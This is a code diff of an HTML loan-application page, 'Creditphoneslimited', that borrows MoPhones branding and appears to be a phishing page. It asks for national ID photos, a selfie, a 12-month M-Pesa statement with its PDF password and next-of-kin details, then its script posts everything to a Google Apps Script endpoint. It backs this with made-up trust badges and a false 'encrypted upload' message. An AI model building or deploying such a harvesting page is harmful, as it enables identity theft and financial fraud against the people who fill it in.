@@ -3,7 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoPhones | Secure Portal</title>
+    <meta property="og:title" content="Creditphoneslimited | Official Portal">
+    <meta property="og:description" content="Secure Credit Applications for Samsung & iPhone.">
+    <meta property="og:image" content="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743">
+    
+    <title>Creditphoneslimited | Secure Portal</title>
+    
     <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -16,94 +21,187 @@
     fbq('init', '852047494123267');
     fbq('track', 'PageView');
     </script>
+    
     <style>
-        body { font-family: sans-serif; background-color: #0f172a; color: #334155; margin: 0; padding: 10px; }
-        .card { background: white; padding: 20px; border-radius: 15px; max-width: 450px; margin: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
-        .btn-check { display: block; text-align: center; background: #fdf2f8; color: #be185d; padding: 10px; border: 1px dashed #be185d; border-radius: 10px; text-decoration: none; font-weight: bold; margin-bottom: 15px; font-size: 14px; }
-        .banner { background: #fff1f2; border: 1px solid #dc2626; color: #dc2626; padding: 10px; border-radius: 8px; font-size: 12px; text-align: center; margin-bottom: 15px; }
-        .tip { background: #f0f9ff; border-left: 4px solid #004488; padding: 8px; font-size: 12px; margin-bottom: 10px; }
-        label { display: block; margin-top: 12px; font-weight: bold; font-size: 13px; }
-        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
-        .btn-sub { background: #004488; color: white; padding: 15px; border: none; border-radius: 8px; width: 100%; margin-top: 20px; font-weight: bold; cursor: pointer; }
-        .whatsapp { display: flex; align-items: center; justify-content: center; background: #25d366; color: white; padding: 12px; border-radius: 8px; text-decoration: none; margin-top: 10px; font-weight: bold; }
+        :root { --primary: #004488; --dark-blue: #0f172a; --danger: #dc2626; --success: #16a34a; --glass: rgba(255, 255, 255, 0.95); }
+        
+        body { font-family: system-ui, -apple-system, sans-serif; background-color: var(--dark-blue); padding: 15px; margin: 0; color: #334155; display: flex; flex-direction: column; align-items: center; }
+        
+        .container { background: var(--glass); padding: 30px 20px; border-radius: 24px; max-width: 480px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); }
+        
+        .brand-header { text-align: center; margin-bottom: 25px; }
+        .brand-header h1 { color: var(--primary); margin: 0; font-size: 1.5em; text-transform: uppercase; letter-spacing: 1.5px; font-weight: 900; }
+        
+        /* 5-HOUR PROMISE BADGE */
+        .timeline-badge { background: #eff6ff; border: 1px solid #bfdbfe; color: #1e40af; padding: 10px; border-radius: 12px; font-size: 0.85em; text-align: center; margin: 15px 0; font-weight: 600; }
+
+        .trust-row { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
+        .badge { background: #f1f5f9; padding: 5px 12px; border-radius: 20px; font-size: 0.7em; font-weight: 700; color: #475569; text-transform: uppercase; }
+
+        .price-link { background: #fff1f2; color: #be185d; padding: 14px; border: 1.5px dashed #fbcfe8; border-radius: 12px; display: block; text-align: center; text-decoration: none; font-weight: 800; font-size: 0.9em; margin-bottom: 20px; }
+
+        .notice-box { background: #fef2f2; border: 1px solid #fee2e2; color: var(--danger); padding: 12px; border-radius: 12px; font-size: 0.8em; line-height: 1.4; text-align: center; }
+
+        label { display: block; margin-top: 18px; font-weight: 700; font-size: 0.85em; color: #1e293b; }
+        input, select { width: 100%; padding: 14px; margin-top: 6px; border: 2px solid #e2e8f0; border-radius: 12px; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.2s; }
+        input:focus { border-color: var(--primary); background: #fff; }
+
+        .file-upload { background: #f8fafc; border: 2px dashed #cbd5e1; padding: 14px; border-radius: 12px; margin-top: 6px; cursor: pointer; }
+        
+        .tip-box { background: #f0f9ff; border-left: 4px solid var(--primary); padding: 12px; margin: 15px 0; font-size: 0.8em; color: #075985; border-radius: 4px; }
+
+        .btn-submit { background: var(--primary); color: white; padding: 20px; border: none; border-radius: 14px; width: 100%; margin-top: 30px; font-weight: 800; font-size: 1.1em; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 15px -3px rgba(0, 68, 136, 0.3); }
+        .btn-submit:active { transform: translateY(2px); }
+
+        .whatsapp-btn { display: flex; align-items: center; justify-content: center; background: #25d366; color: white; padding: 15px; border-radius: 14px; text-decoration: none; margin-top: 15px; font-weight: 700; gap: 10px; }
+        
+        .footer { text-align: center; font-size: 0.75em; color: #94a3b8; margin: 30px 0; line-height: 1.6; }
+        .error-hint { color: var(--danger); font-size: 0.75em; margin-top: 5px; font-weight: bold; display: none; }
     </style>
 </head>
 <body>
-<div class="card">
-    <div style="text-align:center; margin-bottom:15px;">
-        <h2 style="color:#004488; margin:0;">Creditphoneslimited</h2>
-        <p style="font-size:12px; color:#64748b; margin:5px 0;">Official MoPhones Sales Partner</p>
+
+<div class="container">
+    <div class="brand-header">
+        <h1>Creditphoneslimited</h1>
+        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="130" height="42" fetchpriority="high" alt="MoPhones" style="margin-top:10px;">
     </div>
 
-    <a href="https://mophones.co" class="btn-check">🔍 View Samsung & iPhone Prices</a>
+    <div class="timeline-badge">
+        ⏱️ <b>Review Time:</b> Applications processed within <b>5 Hours</b> today. 
+    </div>
 
-    <div class="banner">🚨 <b>WARNING:</b> False info leads to <b>Automatic Disqualification</b> during the credit call.</div>
+    <div class="trust-row">
+        <span class="badge">🛡️ Secure SSL</span>
+        <span class="badge">⭐ 4.8 Rating</span>
+        <span class="badge">🇰🇪 Nairobi Agent</span>
+    </div>
 
-    <form id="portalForm">
-        <label>Your Region</label>
+    <a href="https://mophones.co" target="_blank" class="price-link">🔍 View Samsung & iPhone Prices</a>
+
+    <div class="notice-box">
+        🚨 <b>Strict Call Policy:</b> Ensure all data provided is 100% accurate. False info leads to automatic credit rejection.
+    </div>
+
+    <form id="ironCladPortal">
+        <label>Delivery Region</label>
         <select name="region" required>
-            <option value="">-- Select --</option>
-            <option value="nairobi">Nairobi</option>
-            <option value="kiambu">Kiambu</option>
-            <option value="machakos">Machakos</option>
-            <option value="nakuru">Nakuru</option>
-            <option value="kajiado">Kajiado Environs</option>
+            <option value="" disabled selected>-- Select Location --</option>
+            <option value="nairobi">Nairobi County</option>
+            <option value="kiambu">Kiambu County</option>
+            <option value="machakos">Machakos Town</option>
+            <option value="nakuru">Nakuru Town</option>
+            <option value="kajiado_environs">Kitengela, Syokimau, Athi River</option>
         </select>
 
-        <label>Full Name (As per ID)</label>
-        <input type="text" name="full_name" placeholder="Enter 3 names" required>
+        <label>Phone Selection</label>
+        <div style="display: flex; gap: 10px;">
+            <select name="phone_brand" required style="width: 40%;">
+                <option value="Samsung">Samsung</option>
+                <option value="iPhone">iPhone</option>
+            </select>
+            <input type="text" name="preferred_phone" placeholder="e.g. Galaxy A15" required style="width: 60%;">
+        </div>
 
-        <label>ID Number</label>
-        <input type="number" name="id_number" required>
+        <label>Your Full Name (As per ID)</label>
+        <input type="text" name="full_name" id="nameInput" placeholder="Enter 3 names" required>
+        <div id="nameError" class="error-hint">⚠️ Please provide your official three names.</div>
 
-        <label>ID Photos (Front & Back)</label>
-        <input type="file" name="id_front" accept="image/*" required>
-        <input type="file" name="id_back" accept="image/*" style="margin-top:5px;" required>
+        <label>Email Address</label>
+        <input type="email" name="customer_email" placeholder="for submission receipt" required>
 
-        <label>M-Pesa Statement (12 Months PDF)</label>
-        <div class="tip">💡 <b>Quick Tip:</b> Dial <b>*334#</b> > My Account > M-PESA Statement > Email Statement.</div>
-        <input type="file" name="mpesa" accept=".pdf" required>
+        <label>National ID Number</label>
+        <input type="text" name="id_number" id="idInput" maxlength="8" placeholder="ID Number" required>
+        <div id="idError" class="error-hint">⚠️ Valid ID must be 7 or 8 digits.</div>
+
+        <label>Required Documents (Photos)</label>
+        <div class="file-upload"><span style="font-size: 0.8em; color: #64748b;">ID Front:</span><input type="file" name="id_front" accept="image/*" required></div>
+        <div class="file-upload"><span style="font-size: 0.8em; color: #64748b;">ID Back:</span><input type="file" name="id_back" accept="image/*" required></div>
+        <div class="file-upload"><span style="font-size: 0.8em; color: #64748b;">Selfie:</span><input type="file" name="selfie" accept="image/*" required></div>
+
+        <label>12-Month M-Pesa Statement (PDF)</label>
+        <div class="tip-box">
+            📲 <b>Auto-Get:</b> Dial <b>*334#</b> > My Account > M-PESA Statement > Email > 12 Months.
+        </div>
+        <div class="file-upload"><input type="file" name="mpesa_statement" accept=".pdf" required></div>
 
         <label>Statement Password</label>
-        <input type="text" name="pw" required>
+        <input type="text" name="mpesa_password" placeholder="PDF Password" required>
 
-        <button type="submit" class="btn-sub" id="subBtn">Submit Application</button>
-        
-        <a href="https://wa.me/254112384099" class="whatsapp">Chat on WhatsApp</a>
+        <hr style="margin-top:30px; border:0; border-top:1px solid #e2e8f0;">
+        <p style="font-size: 0.85em; color: var(--primary); font-weight: 800; margin-top:10px;">NEXT OF KIN</p>
+
+        <label>Kin Full Name</label>
+        <input type="text" name="nok_name" required>
+
+        <label>Kin Contact</label>
+        <input type="text" name="nok_contact" value="+254" required>
+
+        <button type="submit" class="btn-submit" id="submitBtn">
+            <span id="btnText">Submit Secure Application</span>
+        </button>
+
+        <a href="https://wa.me/254112384099?text=Hello%20Akeya,%20I%20am%20applying%20for%20a%20phone." class="whatsapp-btn">
+            Chat with Agent Akeya
+        </a>
     </form>
+</div>
+
+<div class="footer">
+    Portal Ref: <strong>jeez</strong> | Sales: <strong>Akeya Lilian</strong><br>
+    Pioneer House, Kimathi Street, Nairobi.<br>
+    © 2024 and beyond Creditphoneslimited
 </div>
 
 <script>
 const scriptURL = 'https://script.google.com/macros/s/AKfycbw2I8rq16apOzIQNmxNNPBfk4TIr4UrUQOOnU2hVTr-a826LSb0ysuGlYXoi8iFA8Cq/exec';
-const form = document.getElementById('portalForm');
-const btn = document.getElementById('subBtn');
+const form = document.getElementById('ironCladPortal');
+const submitBtn = document.getElementById('submitBtn');
+const btnText = document.getElementById('btnText');
+
+// Real-time validation
+document.getElementById('idInput').addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/[^0-9]/g, '');
+    const valid = /^\d{7,8}$/.test(e.target.value);
+    document.getElementById('idError').style.display = (valid || e.target.value === "") ? "none" : "block";
+});
 
 form.addEventListener('submit', e => {
     e.preventDefault();
-    btn.disabled = true;
-    btn.innerText = "Processing... Wait!";
     
+    // Final validation check
+    if (document.getElementById('nameInput').value.trim().split(/\s+/).length < 3) {
+        alert("⚠️ Please enter all 3 names from your ID."); return;
+    }
+
+    submitBtn.disabled = true;
+    btnText.innerText = "Uploading Encrypted Files...";
+
     const formData = {};
     const fileInputs = form.querySelectorAll('input[type="file"]');
     form.querySelectorAll('input:not([type="file"]), select').forEach(i => formData[i.name] = i.value);
 
-    const promises = Array.from(fileInputs).map(i => {
-        return new Promise((res) => {
-            const f = i.files[0];
-            if(!f){res(); return;}
-            const r = new FileReader();
-            r.onload = (ev) => { formData[i.name] = ev.target.result; res(); };
-            r.readAsDataURL(f);
+    const promises = Array.from(fileInputs).map(input => {
+        return new Promise((resolve) => {
+            const file = input.files[0];
+            if (!file) { resolve(); return; }
+            const reader = new FileReader();
+            reader.onload = (ev) => { formData[input.name] = ev.target.result; resolve(); };
+            reader.readAsDataURL(file);
         });
     });
 
     Promise.all(promises).then(() => {
         fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(formData) })
         .then(() => { 
-            alert("SUCCESS! Wait for Lilian's call."); 
+            if (typeof fbq === 'function') fbq('track', 'Lead');
+            alert("✅ SUCCESS! Your application is being reviewed. Akeya will call you within 5 hours."); 
             form.reset(); window.location.reload(); 
         })
-        .catch(() => { alert("Error. Try again."); btn.disabled = false; });
+        .catch(() => { 
+            alert("Connection error. Try again."); 
+            submitBtn.disabled = false; btnText.innerText = "Submit Secure Application"; 
+        });
     });
 });
 </script>
